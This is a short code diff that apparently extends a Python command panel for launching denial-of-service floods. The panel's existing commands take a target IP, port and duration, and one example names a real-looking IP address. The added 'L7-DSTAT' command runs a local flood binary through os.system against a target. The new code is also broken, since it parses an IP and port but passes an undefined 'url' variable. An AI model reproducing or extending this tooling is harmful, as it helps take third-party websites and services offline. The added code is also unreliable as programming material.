@@ -465,6 +465,17 @@ def main():
                 print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                 print('Example: ovh-beam GET 51.38.92.223 80 60')
 
+        elif "L7-DSTAT" in cnc:
+            try:
+                method = cnc.split()[1]
+                ip = cnc.split()[2]
+                port = cnc.split()[3]
+                time = cnc.split()[4] 
+                os.system(f'./L7-DSTAT {url} {time} 1024')
+            except IndexError:
+                print('Usage: L7-DSTAT <url> <time>')
+                print('Example: L7-DSTAT <url> <time>')
+
         elif "http1" in cnc:
             try:
                 ip = cnc.split()[1]
